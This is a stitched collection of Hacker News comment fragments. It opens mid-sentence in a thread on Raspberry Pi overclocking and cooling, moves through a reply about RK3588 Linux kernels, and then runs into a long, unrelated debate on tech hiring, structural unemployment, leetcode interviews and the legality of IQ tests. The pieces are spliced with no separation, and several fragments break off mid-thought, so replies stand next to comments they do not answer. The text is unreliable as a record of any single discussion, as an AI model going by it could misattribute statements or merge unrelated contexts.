the time having 2 processors was nearly useless. reply geerlingguy 16 hours agorootparentHeh, back in those days decent cooling was a lot easier than now (for overclocking, at least). That's one nice thing working on these little mobile chips—I don't need a $300 cooler, I can use a cheap little water block, or a small peltier element that doesn't cost much at all... and it's not being a space heater for the room. It's only pulling maybe 10-20W max. reply metadat 15 hours agorootparentWhere are these \"cheap\" water blocks you speak of? Haha, I've never encountered such a thing. Except maybe the $100 Corsair liquid coolers, but c'mon, they aren't real water cooling reply bayindirh 10 hours agorootparentprevI have overclocked a 1433MHz Athlon 1700+ (TBred/B IIRC) to 2200 MHz (3200+ levels) with an AN7-Ultra. The secret sauce was running it at 200x11, with 1T capable RAMs, and that thing was snappier than \"bog standard\" 3200+ systems a considerable amount. Without much of a voltage bump, and a good cooling solution, it ran within its thermal design without noise, and with rock solid stability. That system lived more than 15 years IIRC. reply riedel 13 hours agorootparentprevI still remember that time, when you actually waited for the low end chip to be released and get it as fast as the earlier released flagships. Was a different time. But I also roughly remember having a dual socket board at the time with two overclocked celerons if my mind does not fool me. Funnily my wife is still using this 25 year old PC case, in which I glued bitumen for sound damping, for her current ryzen based PC. reply MattPalmer1086 10 hours agorootparentHaha, yes, back in the 90s I had a dual Gigabyte motherboard and two 300Mhz Celerons overclocked to 450. Helped a lot with 3d animation and video rendering, but not much else! reply jonatron 10 hours agorootparentprevI have extensive experience in watching LTT's jank cooling videos, and I think water cooling with a big relatively big reservoir would be able to keep the temperature at a chosen temperature.

This results in high VT cells performing better when warmer, the opposite of what we are used to. At the \"normal\" operating conditions (temp and frequency), this shouldn't be noticeable but when your at the absolute frequency limit it's not ideal for your critical path (where you normally use HVT cells) to get any slower. Perhaps it's related to this. reply ZiiS 2 hours agorootparentprevWonder if it was more to do with deltas. Everything at 50° might be more stable then hotspots? reply whalesalad 4 hours agoprevpi's feel like the perfect candidate for submerged liquid cooling. imagining a tiny little french fry basket filled with pi's being lowered into some mineral oil and bubblin. salt to taste. reply fl0ki 19 hours agoprevIs there a consensus on the best available cooler for the Pi 5? I looked at this exact unit but wanted more of a \"case\" design. I first tried the Flirc passive case. It seems to transport and dissipate heat notably better than active coolers with copper heatsinks and 4000 RPM fans. That's especially impressive given that the entire top and bottom are plastic, leaving the horizontal edge as the only surface for heat dissipation. My remaining concern there is that it only cools the Broadcom SoC, while creating a nice little insulated oven for the other chips. The inner surface area is much greater than the outer surface area, and with no ventilation by design, so heat from the SoC is being distributed throughout the whole inner volume. I also tried an active cooler to avoid that, which I'm sure is better for every other chip but I'm surprised to find was substantially worse for the SoC itself. I guess the tiny copper block gets saturated very quickly and its surface area isn't very large for air cooling. Maybe that's why the monoblock passive coolers do so well, in theory they combine the best of these approaches. I just wish they'd apply the same idea to a refined \"case\" design like the Flirc. reply wpm 14 hours agoparentif you don't need the pi to stack I've found the Argon One to be a good case for both overclocked 4's and 5's. The fan is somewhat weedy and the airflow is questionable, but the entire case acts as a heatsink. As far as thermal mass goes I don't know of any that beat it. And additionally, you get a Pi case that puts all the ports on one edge where they belong instead of forcing you to make cable squids on your workbench/desk. reply LeoPanthera 17 hours agoparentprevI also use the flirc cases and have been similarly concerned by the other components getting hot, but I must admit that it doesn’t seem to cause any actual problems, at least not yet, and it certainly does a good job of keeping the CPU cool. reply rolobio 16 hours agoparentprevI have always found coolers with heat pipes provide the best cooling for mine. reply mbesto 19 hours agoprev> There's a silicon lottery Isn't there also an environmental factor that hasn't been fully explore? Are we sure there isn't an alternative to the cooling mechanism on the CPU than the two options the parent and Jeff used? reply hinkley 17 minutes agoparentHow much voltage noise can get from a PSU to the cpu these days?

It means that you will not get hardware acceleration support when compiling and installing the kernel from `torvalds/linux` instead of `raspberrypi/linux`. As for the RK3588 SBCs, you are free to choose to use Linux 5.10 LTS (legacy) or 6.1 LTS kernel, both of which are officially supported by Rockchip. Or alternatively, use the bleed edge kernel 6.9. Official 3D acceleration will be available in Mesa 24.1 and Linux 6.10, and the developers have also backported it to 6.1 LTS for ease of use. In addition to Armbian, you can also use `ubuntu-rockchip`, which has full hardware-accelerated desktop/server Ubuntu 22.04/24.04 LTS support. https://github.com/Joshua-Riek/ubuntu-rockchip The VPU used by video decoding has nothing to do with 3D/GPU.

Structural unemployment happens when the skills of the work force don't match the needs of employers, so there is both unemployment and difficulty hiring. Structural unemployment is usually high when there's a rapid change in demand for skills, as of course there is in tech. It results in crazy high salaries too. People with machine learning experience are getting 7-figure offers, while people with jQuery experience can't find jobs. As an individual, you can both improve the economy AND make fat stacks by learning the skills that are in high demand. As an employer, you can do better by finding skill sets that aren't in high demand, with enough overlap with what you need that you can retrain.

(i am not saying this to criticize the comment but just to point out one of the many differences between unions in the US and europe) the problem with apprentice programs is that they lag behind the changes in the industry. when i was in school there were none for software developers for example. there are now, but the second problem is that apprentice programs are considered of lower status compared to studying at a university. think blue-collar programmers vs white-collar software developers. the pay is also different. i don't know anything about union accreditation programs, but i can imagine that they would be targeted at the available jobs, and with unions in the US having more influence at who gets hired, they probably can make sure that an accreditation actually leads to a job. apprentice programs traditionally also promised that you'd get hired at the company where you learned, but this is no longer certain. together with the status and pay differences it is no surprise then that the number of people starting apprentice programs is declining. on the other side university studies are not targeted at the industry. which only adds to the perception of candidates not matching employers needs. as an employer it is difficult to tell whether a candidate with a diploma is actually capable of doing the job. reply alephnerd 1 hour agorootparentprevIt would only make it harder for new grads, as unions aim to help their constituents increase salaries, which means paying non-union hires waaaaaay less.

However, regardless of \"who started it\" in this round, ultimately, it is unquestionably a situation we can lay at the feed of industry, which abandoned decades ago the practice of actually training new hires for their positions. Sure, there are prerequisites they can expect (eg, in a programming position, you can expect some level of school learning or experience with programming in general, or particular categories of program/lanugauge), but the degree to which employers are willing to train people on the stuff they use has declined precipitously since the late 20th century. This is a well-known phenomenon, and it is substantially responsible for the modern arms race between job-seekers and prospective employers: if you know that whoever you bring on will get 3 months of well-designed training for the role they'll be filling, you don't need to spend 6 months vetting them over 10 rounds of interviews for an entry-level position. reply avmich 3 hours agorootparentThe situation is bad enough that even for a moderate-sized codebase a newly hired employee is expected to contribute within increasingly (decreasingly?) short time.

Chill atmosphere and not going by a checklist helped a lot as well, to both sides. reply jongjong 3 hours agorootparentprevYes, looking at big company interview processes, it can give you a huge unfair advantage if you can know what kinds of technical questions would be asked ahead of time. It's kind of ridiculous and counter-productive that employers are obsessed with selecting developers who can solve problems under time pressure. The kind of developer who writes code quickly may also be the kind of developer who jumps to conclusions too quickly; this attitude is a huge problem in the medium and long term when working on any decent size project. Choosing sub-par solutions can trigger a cascade of negative consequences for the project over time. Often, it's better to have developers who are really thorough and don't move to the next stage until all reasonable possibilities have been considered. The people who can solve problems quickly are often not the same people who can solve problems optimally. The current system seems to favor fast-moving code monkeys with zero understanding of architecture or security. reply mistrial9 2 hours agorootparentnot arguing this but, the assumption here is a certain kind of production web developer and similar things.. not all coder problems are hired this way.. unfortunately, ranks of new company leadership actually do not know themselves about this, dealing with money and personal power relationships daily.. so they copy others in the hiring practices and so do the personnel and low-level managers, who are vulnerable to termination themselves.. an industry expanding into distant lands with telecommute for ever faster results with ever cheaper workers, appears to be embracing the AI interview and AI CoPilot assistant standard, to further reduce the bargaining power and individual contributions of employees for writing ordinary code reply jongjong 2 hours agorootparentWhat I find weird is that the kind of people that they're hiring are the kinds of people who are easier to replace with AI. AI is useless at big-picture reasoning when coding. It's only good for short snippets. Yet companies seem to reject developers who are good at big-picture, architectural thinking. reply badpun 2 hours agorootparentprevI think there's still training for positions (which often means - the company's specific tech stack) - it's what the \"junior\" positions are. If, on the other hand, the candidate more or less fits the tech stack and other requirements (domain knowledge etc.) already, the company can skip the training, and offer a \"senior\" position, for more money. That's the reality of most software positions - they're hyper-specialized, and key competencies don't transfer between them. It's similar in medicine - a top cardiologist could at best be hired as a \"junior\" pulmonologist-in-training, even though he may be a doctor with 20 years of experience. reply jongjong 3 hours agorootparentprevSome of those interview questions have ridiculously short time constraints. You need to be perfectly rested and well practiced in order to finish the exercises in time. Some of these tests seem to select for cheaters because only cheaters who either knew the questions ahead of time or who used AI to solve the problem could finish them in time. reply SideQuark 4 hours agorootparentprevQuite often perception of reality matches actual reality. I've found it extremely rare to the point of almost being non-existent that what engineers think a company needs or should do is accurate compared to what a company needs or should do. reply avmich 3 hours agorootparentProbably to what company thinks the company needs or should do?

FTFY, not to be a pedant, but to highlight the fact that many white people from certain backgrounds also struggle with this, while well-connected minorities largely do not. In fact, connected minorities essentially have super-powered network effects since the demand for minorities who can jump through all of the hiring hoops greatly exceeds the supply. reply giantg2 3 hours agorootparentI'm not just talking about population level racial minorities. It can be things like disabilities, or even white people in areas/industries/ teams with a majority Asian population. It could even be somewhat based on political or religious beliefs and the other cultural-social background that forms what hobbies and other activities you might meet someone at. Yeah, certain minorities can benefit from programs that value them above others, but the above and beyond results you talk about come after the main connections are made. This doesn't extend to all minority groups either, like those with invisible disabilities (after all, it's mostly about how things look). reply cmilton 1 hour agorootparentprevI think you may be assuming the parent poster's definition of minority. reply anal_reactor 54 minutes agorootparentprev> many white people from certain backgrounds Sad Eastern European noises, aka \"You are on this council, but we do not grant you the rank of master\" reply WarOnPrivacy 2 hours agorootparentprev> In fact, connected minorities essentially have super-powered network... ...in isolated pockets where those things exist.

My road was still super hard - but it was easier than it was for women, brown people, etc. In 1990 I moved to FL and ran headfirst into no connections=no work. I did the Make Your Own Luck thing. Hundreds of brief introductions led to a few relationships. A few of those became potential leads. It was a years long process. The eventual successes hinged on a few, key connections with people who saw something familiar. If I hadn't been familiar, I wouldn't have been remembered past the introduction. reply underdeserver 4 hours agorootparentprevThere is a very large number of employers. If you want to convince me they're all unreasonable, you'll need to show me some pretty compelling evidence. reply CoolGuySteve 4 hours agorootparentThey're almost all cargo culting the same whiteboard algorithm hiring criteria for otherwise humdrum jobs so yeah, they're all kind of unreasonable. An HR fad can cause structural employment just as easily as bona fide requirements not being met. reply cjbgkagh 3 hours agorootparentThey are cargo cutting, I was about to make the same point. I am more likely to get a leetcode quiz from a small company trying to emulate a FAANG company than I am from an interview with an actual FAANG company. Leetcode is part a costly signal given the study that has to be put into it, and part IQ test. I think part of the proliferation of leetcode is due to the illegality (edit: in effect even though not explicitly) of using IQ tests. But if someone could have a certified IQ test they could reuse that one test result for the entire job market improving liquidity. It would be no worse than leetcode as the IQ part of leetcode is in effect already an inefficient and arduous IQ test that people have to take repeatedly. The costly signal was supposed to be university but the academies have sold out their responsibilities. I think the effort to democratize university education, instead of lifting people up, has instead dragged universities down. The reason I think the solution is difficult is that we have to chose between a more fair world where just about anyone can get a degree and IQ tests are illegal but we have to keep taking these leetcode tests. Or a less fair world where an IQ test / SAT score and a university certificate is sufficient. reply avmich 3 hours agorootparentCan we have similar tests for companies, some formalized employment-worthiness? reply cjbgkagh 3 hours agorootparentI think previous work history is currently most used as a substitute. As in the hiring company assumes the previous companies have acted as a gatekeeper. Given the amount of money involved it would be difficult to maintain a formalization / certification process that would be both trusted and resistant to corruption. reply avmich 2 hours agorootparentNo, I mean just like companies would like to see a sort of IQ test results for applicants, I'd assume applicants would like to see a sort of employment-worthiness test for the companies. Previous work history here could be the history of that particular aspiring company of hiring people and people leaving the company. reply cjbgkagh 2 hours agorootparentAh, I see, I think companies being far fewer than people are more able to operate on reputation in a way that would be impractical for general mass of individuals. The companies can and do pay PR to try to influence that reputation, as can individuals, and many high profile individuals do in fact hire PR. Glassdoor is one public source of info, but there is generally quite a lot of gossip around companies. People can reach out to current employees of an company like employers can reach out to previous employers of an individual and I've never had an interview where I was unable to ask the interviewer questions about the company. Perhaps a proxy for a corporate IQ test would be net earning per employee which is often pretty public information. reply tptacek 3 hours agorootparentprevIt is not illegal to give candidates IQ tests. There are huge firms that do so openly. The practice isn't widespread because it doesn't work well, not because it's proscribed. reply cjbgkagh 3 hours agorootparentAny test that has disparate impact is in effect illegal. Leetcode at least makes this process more opaque which helps limit liability. I have edited my post to note that there is no explicit legislation making IQ tests illegal in the US. reply projectazorian 2 hours agorootparent> Any test that has disparate impact is in effect illegal Nope, it just has to be shown to be relevant to the requirements of the job. So you call it an \"employment skills assessment,\" make 80% of it indistinguishable from an IQ test, and add some domain-specific questions related to the industry or the position. P&G has done this for a long time, among other companies. reply cjbgkagh 2 hours agorootparentThis has been true for a long time but I would suggest that it's no longer true, or at least less true. Such aptitude tests, the opaque form of IQ tests, are now increasingly and effectively being challenged on the same disparate impact that IQ tests were. Rather recently the NY Teachers aptitude test was demonstrated to have disparate impact resulting in a payout of $1.8B. Perhaps one way to get rid of leetcode would be to demonstrate that it also has a disparate impact. Though I have little hope that what would replace leetcode would be any better, especially since it would have to be even more opaque than leetcode already is. reply tptacek 1 hour agorootparentThe teachers aptitude test involved errors in scoring the test, not a conceptual problem with aptitude testing teachers. reply cjbgkagh 1 hour agorootparentAs it appears you are more familiar with the case than I am, it would be helpful if you could point out what those errors are? As best I can tell 'Judge Wood ruled that an older state-certification test, which was intended to measure teachers’ knowledge of the liberal arts and science, was racially discriminatory.' Elsewhere I'm seeing \"The court found that Black and Latino teachers clearly passed these tests at lower rates than white teachers. In order to prove that this wasn't illegal, the defendants had to show that the test actually demonstrated what it promised: that teachers who did well on the test would do better in their jobs.\" It seems to me that the error was using the wrong test and it was the wrong test because it had disparate impact. What it does not appear to be is a case that is not about disparate impact because it instead had errors. reply tptacek 1 hour agorootparentAhh, I'm looking at a much more recent case in New Jersey, not this one from 10 years ago. The test you're talking about isn't an IQ test; it's a heavily and obviously culturally-loaded literacy test. The whole point of actual IQ tests is to isolate intellectual aptitude from cultural literacy. (I'm writing as if I think real IQ tests are a good idea, and they are not --- in fact, that's my whole point: there's a mythology that IQ tests aren't used because they're illegal, but they are not that; what they are is ineffective.) reply cjbgkagh 1 hour agorootparentThe efficacy of IQ tests are a separate argument and the general abandonment of IQ tests by corporations as a demonstration of their inefficacy would be more substantive if such tests were not in effect made illegal at the same time. I.e. if IQ testing conferred no possible legal liability then the spontaneous abandonment of their use might be evidence of their ineffectiveness. reply tptacek 50 minutes agorootparentI'm saying, if you want to cite a case as an example of why IQ tests are legally disfavored, the case should be about an IQ test. reply cjbgkagh 36 minutes agorootparentIn my view that is not how logic works, I think we've passed the point of productive discussion and I will leave you to your beliefs. tptacek 2 hours agorootparentprevI don't need to litigate this, but they're not \"effectively\" illegal either. Again: big firms with huge HR departments and lots to lose use then, and brag about it. reply cjbgkagh 2 hours agorootparentThose I assume also have big legal departments, for smaller companies such lawsuits can be extinction events. This has been previously discussed in detail on HN 12 years ago; https://news.ycombinator.com/item?id=2414135 I would suggest that times have changed since then and disparate impact lawsuits are now more likely to prevail in 2024 than in 2012, so the in-effect aspect has increased since then. I know quite a few CEOs who confide in me that they would rather give IQ tests but do not because of their concerns over legal consequences. Clearly this is anecdotal but this sentiment does seem to be pervasive and extensive and repeated throughout the internet over a long period of time. It would be helpful if you could list some of these companies that publicly state they give IQ tests. I've only heard about this as a practice at hedge funds and even then it was public knowledge / gossip but not publicly stated. In my brief search for such companies I came across this; https://nypost.com/2022/03/15/silicon-valley-firm-apologizes... which is a company that has now apologized for giving IQ tests and is being warned about the legal consequences for having them. reply tptacek 1 hour agorootparentThis NY Post story is speculative; the VC firm that did this (stupid) hiring thing, of asking people to take a free online IQ test and a Meyers-Briggs personality test(!), got called out on Twitter and backed down, blaming the process on an intern. They weren't sued. I'm not saying you won't get dunked on if you, for instance, Wonderlic-test applicants for your tech company. You will. But I don't think you're going to get sued. reply cjbgkagh 1 hour agorootparentI'm grasping at straws looking for a counter example to my overall assertion, that it is not a great counter example does not undermine my case. I made a genuine good faith effort to find them - you could help me out a lot if you could list these companies that boast publicly about administering IQ tests. That would go a long way to demonstrating that such tests are not in effect illegal. My assertion is that IQ tests are already known to have disparate impact and with laws as they are in effect they are illegal. My next assertion is that aptitude tests will suffer the same fate as IQ test because they too will be shown to have disparate impact for the same reasons. That not all such aptitude tests have been sued already under this law does not make them safe from lawsuits as the burden of proof is on the company using them. reply tptacek 50 minutes agorootparentWere that the case, several of the largest employers in the country should be getting routinely sued for hiring discrimination. They are not. reply cjbgkagh 40 minutes agorootparentOk, so what several largest employers are you talking about? If this is pubic knowledge as you allege then there is no need to be obtuse. And again, that list of employers that publicly brag about continued administering of IQ tests would be rather helpful to your case and would allow me to substantively check your assertion. I don't understand why in good faith you would not want to share this information. You cannot use the absence of lawsuits for a list of companies that you are keeping secret as evidence of absence of legal liability. reply noobermin 4 hours agorootparentprevLook at the recent crypto bubble that popped. I'd point to the current potential hype cycle although that's contentious here. For the crypto fad, there was no demonstrated profit beyond speculation, yet lot's of money was poured into it. I have no explanation that can be explained by so-called market mechanisms, it's just chasing hype. reply Mountain_Skies 3 hours agorootparentprevThe latest fad appears to be forcing all candidates to be vetted by an external recruiter, even if they are already known to people inside the company. Apparently, this is for reasons of \"fairness\", but it's yet another segment of an increasingly long pipeline full of holes that drop out candidates somewhat randomly rather than based on the actual required attributes to perform the job effectively. The HR filter was already bad enough but now having a recruiter filter before the HR filter just means even more random rejections of candidates who could have filled the role successfully. reply golergka 3 hours agorootparentprevI've gone through a lot of job seeking in the last year (two companies in a row I've worked for have closed). Didn't have a single leetcode challenge. And I'm looking for us companies who hire remotely from other countries but pay at the us level, so it's supposedly about the hardest difficulty setting possible. reply toomuchtodo 4 hours agorootparentprevWhat data would satisfy you that employers are being unnecessarily picky? Provide the criteria. Their costs are sunk, they can push candidates through as many cycles as they want until they can find the cheapest unicorns pushed through their pipelines. There is also strong evidence that some employers are cutting anyone with a developed world wage and pushing that work to cheap countries (Google, very publicly, but there are others). My hot take is the labor market was very tight, employers thought they were going to get a deal on folks with the layoffs [1] that took place over the last 2 years, but the labor market still remains tight so they continue to search for \"diamonds in the rough\" at lower costs (which leads to this mismatch at scale). Offshoring is cost optimization to continue to realize desired profits in a high capital cost macro, and there is probably some knock on effect from software development tax code changes [2]. [1] https://layoffs.fyi/ [2] https://news.ycombinator.com/item?id=39133028 reply cratermoon 4 hours agorootparentprevNot all of them, no. But consider: the hiring pipeline looks pretty much the same for all companies? Why is that? Well, they mostly use similar services to manage hiring, and those services all have similar features. But those features aren't great: they've narrowed the hiring pipeline to squeeze all candidates for all jobs down to the same sort of toothpaste that can be squeezed through the pipe. Are the employers unreasonable? No, they are following what is considered HR best practices for attracting and vetting talent. But that process is broken, therefore the majority of companies are struggling to find talent. The process is both homogenized across the industry and fundamentally geared towards preventing false positives - hiring the wrong person. That filters out many people that might have been hired, blowing up the number of false negatives - not hiring the right person. Companies can't find candidates and job seekers can find jobs because the tools and processes for connecting candidates with jobs is both broken and homogeneous across the industry. reply coldpie 3 hours agorootparentprev> You have to be lucky (including knowing someone, ie networking) I don't think it's right to consider networking/knowing someone to be luck, exactly. Networking is a skill and a tool, and has consistently been presented as that for my entire career. As a result, I go out of my way to try to make those connections. I go in to the office, I have lunch and drinks with coworkers, I say Hi to people I recognize from chat at large meetings, I make friendly conversations on chat and email. When someone I have made a connection like that with leaves, I say goodbye and pass them my personal email address. It is difficult, I'm not an outgoing person and I have to make conscious effort to start those connections. But it has paid off, I've received several job pings over the years, and when I was ready to move on from a job recently I took up one of those pings on the offer.

Senior dev, about 30 years experience at the time. A friend knew of an opening somewhere but they wanted GWT experience, I didn't have it so they wouldn't talk to me. 6 weeks later they were still looking. Like I couldn't learn GWT in six weeks? If they hired any decent dev after a good general screening and gave him the docs they could self-learn GWT in less time than that. reply shagie 3 hours agorootparentThe risk is that they hire someone who doesn't know GWT and six weeks later (and six months later) they still don't know it. The ability to do self directed learning of a new skill / technology is something that is difficult to find (a lot of developers that I know don't know how to learn a new version of Java or framework and are still writing code exactly as they did when they graduated college... and they could put down \"Java developer - 5 years experience\" and apply for senior positions.) There are a lot of devs who appear decent with current tech, but lack the ability to learn new tech without someone hand holding them for several months. reply hiAndrewQuinn 1 hour agorootparentThe fact that self-directed learning is so rare even among programmers will never cease to baffle me.

If I wanted to fire someone I just hired, it ends up taking 2-3 quarters (1 Q realize they suck, 1-2 Qs managing them out/building a case) AND looks very bad on the hiring manager because you wasted $1.75*BASE_SALARY of company money and have nothing to show for it. I understand some candidates can learn quickly, but as a hiring manager you learn very quickly to plan and assume for the worst case, because sadly, most people do kinda suck. reply pdimitar 2 hours agorootparentOr you know, you can just hire them as contractors and fire them tomorrow if they don't perform. Every company I worked with in the last 8 years does just that. reply alephnerd 2 hours agorootparentWith contractors you deal with overhead of managing contracts, and American employment law increasing views tech contractors as de facto being FT employees deserving of the same benefits packages as FT employees. At that point your best option is to open an office in India/Israel/Eastern Europe because at least people don't complain as much, you get similar productivity (depending on what you pay), and you don't need to deal with a lot of these headaches. The same thing happened to the CPA/Accounting industry in the 1990s. reply pdimitar 2 hours agorootparentWell, I'm from Eastern Europe and your observations match mine. There is still a huge amount of skilled devs here but USA companies skip them almost automatically. reply alephnerd 2 hours agorootparent> There is still a huge amount of skilled devs here but USA companies skip them almost automatically. English fluency and/or Employment Laws are a big issue as well. Most companies have already had an Israeli or Indian subsidiary since the 1990s-2000s. Most didn't start entering Eastern Europe until the 2010s, and much of that was in Ukraine, Russia, and Belarus thanks to EPAM and the massive Soviet Diaspora in the US. Poland, Czechia, and Romania are known quantities, but newish (late 2000s/early 2010s), and the larger ecosystem (not just engineers but lawyers, bureaucrats, accountants, etc that you need to run a subsidiary) don't have working English fluency and in some countries are Indian bureaucracy level headaches (looking at you Bulgaria) with the added lack of an English speaking ecosystem headaches. In all honesty, if the Russia-Ukraine War didn't start in 2014, much of the Eastern EU's tech scene would have been much weaker as it's largely powered by the UKR/RUS/BEL diaspora who emigrated the moment all 3 countries entered an economic and social tailspin. At a previous employer 5-7 years ago, we had an office in Czechia, but most of the Engineers were Russians or Ukrainians. reply giantg2 3 hours agorootparentprevThe people I have meet who were slower to learn things generally had factors that could be overcome. Burnout is a huge one. If I'm being told to learn this new tech every 3-6 months and not given enough time to become an expert in the thing I previously learned, then why should I put in the effort? Its not a building block in my career. This is how it is for me (plus a disability). It never benefits me, so where's the incentive? reply alephnerd 3 hours agorootparent> Burnout is a huge one Of course, but companies have deadlines to hit and features to release.

Burn through people and spend time and money hiring replacements. reply shagie 2 hours agorootparentCompanies are well aware of Brooks's law and will instead chose to not hire someone and work with existing known productivity levels (and look to see what can be done to improve that) than to hire a risky person that puts existing deadlines even more at risk. That companies aren't hiring people (and complaining that there's no one to hire) is what we're seeing rather than burning through people and dealing with Net Negative Producing Programmers ( https://web.archive.org/web/20030517045551/http://www.pyxisi... ). --- Because people are leaving for greener pa$ture$ at a faster rate, and the higher compensation demanded, companies are mitigating that risk by requiring a person to come in with the expected training rather than spending months training a person who may not be able to preform at expected levels. The other side of that is that there are a lot of places out there that are moving slow and not updating things quickly. I worked at a retail company a number of years ago where you could make $70k / year as a programmer and be able to work at a more leisurely pace. I currently work in the public sector and things are on much longer timescales. However, if you want to work in the fast paced and highly paid sector of Big Tech startups, you may need be able to meet the needs that they have. And there its less risky to have one of the existing employees take on another task than to hire someone (and burn runway faster) that might not be able to contribute until after the runway is gone. reply alephnerd 2 hours agorootparentprevThis is about new hires. Not existing employers. The answer is simple - don't burn out your existing employees. reply giantg2 2 hours agorootparentYeah, but even as a new employee, my past experiences have conditioned me to expect that I will get screwed over the same way even at a new company. reply alephnerd 1 hour agorootparentAnd this is why the job market sucks. Enough hiring managers and applicants have been screwed over by the other that it's become adversarial. It is what it is. ------- My two cents though to you giantg2, the mentality you have is not feasible in the private sector as neither employers nor employees have any loyalty anymore. Either switch to a government programming job (plenty of those now and they are increasingly remote first - especially Federal) or a new industry. Or start learning the game (how to market yourself, constantly upskilling with \"hot\" tech stacks, networking, etc). reply giantg2 46 minutes agorootparentEh, I've been at this job for somethingblike 13 years. Might as well stick at it. There isn't anything feasible for me to switch to anyways. I've tried the marketing shit and it didn't work for me. reply pdimitar 2 hours agorootparentprevYou're basing your entire argument on an arbitrary deadline (six weeks). I am giggling as I am monitoring several job forums and seeing several companies pop up periodically (once a quarter I'd say) looking for the same positions... 2.5 years later. So let's change the example. Is it really worth it to be as picky for 2.5 years? I'd wager they lost money because of that. Any senior dev can learn GWT or anything similar in much less than 6 weeks even (though proficiency is another matter). And ability to self-learn can be somewhat gauged by a take-home assignment. reply alephnerd 2 hours agorootparent> Is it really worth it to be as picky for 2.5 years Yes as an employer. > I'd wager they lost money because of that No. If a role isn't filled in a quarter, that money is in most cases reverted back into the compensation pool used to either help hire a high performer, or give bonuses to the existing team. 99% of a time, an IC Engineering role will NOT make or break a company's entire financial future.

A chore that a senior dev might be an exciting opportunity for a junior. Similarly a daunting task for a junior might might be just the right difficulty for a senior.

But I have no way to prove it to a potential employer than going through an expensive and friction-laden process which could fail at any stage for a reason totally unrelated to the main question of qualifications - like some random interviewer not liking my answer to a weird question like \"tell me about your three biggest failures\" or getting some obscure pet detail of a language wrong when nobody actually uses that corner precisely because of how hard it to get right, or not solving irrelevant leetcode puzzle fast enough.

So far there's none. reply kerkeslager 3 hours agoparentprev> Structural unemployment is usually high when there's a rapid change in demand for skills, as of course there is in tech. It results in crazy high salaries too. People with machine learning experience are getting 7-figure offers, while people with jQuery experience can't find jobs. Another cause of structural unemployment is workforces aging into retirement, and again there's stacks of money to be made filling this gap. This applies to Cobol developers. There are a ton of \"too big to fail or rewrite\" applications written in Cobol, particularly in finance. The people who wrote them are retiring. Finance is generally a great industry to have your hand in the pockets of anyway. A friend of mine has been doing this since shortly after he graduated college in 2010.

(Here \"selling\" means you've been hired for your next job, since you just took the 40 hours you had available every week starting next month and sold it for money.) Within reason, people can be retrained to adjacent jobs or basically could do exactly what an employer wants within a low number of weeks. People know what kind of jobs they're capable of or it can be tested for quickly. Instead there are candidates who spend a year both training themselves and applying for jobs unsuccessfully, while employers spend MORE than the same amount of time on that, if you add up the amount of time recruiters are putting in on behalf of employers and HR puts in and employers put into interviews. It is a market failure for people to want to work, for employers to want to hire them, for them to be able to do the work, but for them not to actually be doing the work. It would be kind of like if people were desperate for any of either tomatoes, carrots, wheat, rice, potatoes, or really anything, whatever they get is fine for them since they can look up recipes for that and make it with a tiny investment of time (this is the demand side), so they are putting in ads for \"Want any of: rice, carrots, wheat, potatoes, tomatoes\" and willing to pay for it! Just put up a hundred ads, a hundred unfilled jobs. On the supply side meanwhile you have a farmer who owns all the necessary land (hours in the day) and has ALL the equipment (a computer, Internet, transportation, clothes, anything anyone needs to start working) and is really willing to produce anything and can do so on that arable land! There are no capital requirements. Great. So we have the demand side taken care of, people want quite a few different types of food and supply side taken care of, the farmer is willing to farm just about anything. But, for some reason, what ends up happening isn't that the fields are filled, it's that there are farmers spending all day every day selling and nobody is buying. And instead of saying, here try this sample, and it's fine, you have a weird request for \"What exactly had grown on these fields since the beginning of time\" (this is called a resume) and then you have buyers inundated with answers to their bizarre requests for \"what has grown on these fields since the beginning of time\" but the buyers still aren't getting the food and the fields are empty, the farmers are trying unsuccessfully to sell all day and the buyers are somehow inundated with sales pitches but aren't actually buying anything, while burning time on putting up advertisements of all the food they want to buy. Why is this happening? How can people not be working but want to work, when they can train into being productive workers within a few weeks and are more than willing to do so? It would be like if shoppers spent days at a time at farmer's markets going from stand to stand and buying nothing, and farmers spent days at a time standing at the farmer's market with buyer after buyer asking them questions about the history of their land and not buying any damn potatoes. It's a potato lady you want it or not? If not step aside so someone who actually wants it can see it. p.s. half of the farmers are asking other farmers to endorse them on linkedin. Buyers ignore this noise completely.

I'm sure in the ML sector right now, it's hell. Seven figure salaries are going to get some optimistic over-reachers desperate to try and get in the door and BS their way through the first few months. My own experience: I had a CEO and board member of the startup I was CTO'ing push a dev my way. \"Brilliant\", they said, \"just really great attitude, check them out see if we can get them hired, fast\". I was excited, and keen to meet them. Turns out their way to code was to find a library (this was a Ruby shop, so technically a gem), that did the thing needed, bolt it in using example code and ship it. \"OK\", I said, \"but we're a startup trying to solve an optimisation problem in the logistics space. There is no gem. We're going to have to be smart and solve this ourselves by reading papers and experimenting and trying things out. How would you do that?\". And I kid you not, the exact response was \"If there isn't a gem, I don't think it's doable, or maybe we should wait until it's done\". When I told my CEO and board member that this great, exciting prospect they found couldn't code, they refused to believe me until I spelled it out really carefully: if we hired them, we'd have to train them to solve problems in code. Like, give them CS50 or something. Is that right for a senior engineer as 4th or 5th hire in a startup? So now I ask some trivia for engineer roles.

The square peg doesn’t exist. You’re going to have to hire someone who doesn’t already have the specific skills you need and invest in training them and educating them. The interview process is just to evaluate if they are capable of succeeding in that process. Yes, it means companies have to take risk. It’s better than the risk of trying to carry on long term short-staffed. reply setgree 4 hours agoparentUnfortunately, the skill of being trainable/educable is very unevenly distributed in the population and very hard to assess from afar. Instead, companies hire based on whether you've already been trained/educated in how to do the thing, which amounts to letting someone else take on the risk associated with your failing to learn something. If I were tasked with solving this, I'd advocate for more frank discussion and use of various pseudo tests, e.g. SAT or GRE scores. This strikes a lot of people as unfair and non-inclusive. reply jimkoen 3 hours agorootparentI think this has less to do with assessment issues in trainability and is rather an economic thought: I don't have to train the employee that has already been trained by my competition.

I think some of the \"easy\" leetcode questions are probably a decent filter, they're often contrived enough to force you t handle an edge case or two but simple enough that they should be solvable within a few minutes - they're a step above fizz buzz. They filter for a few super important qualities - can you solve a simple problem, follow some basic instructions, write somewhat comprehensible code. But most importantly, if you get stuck, how do you react.

I think the following factors contributed to my long unemployment: (1) At first, lousy market for remote jobs. Big layoffs from major tech companies made it an employer's market. (2) Rusty interview skills. I wasn't at all ready for Leetcode-type tests, and I hadn't realized that I suck at live coding tests in general. Practice helped somewhat. (3) Delays from testing the market to determine the new pay rate for my skillset. I.e., for a while I didn't apply to any jobs that paid well below my previous comp. (4) Indecision about my technical focus area. I was doing DL compilers, which didn't really excite me. I wanted to break into traditional compilers.

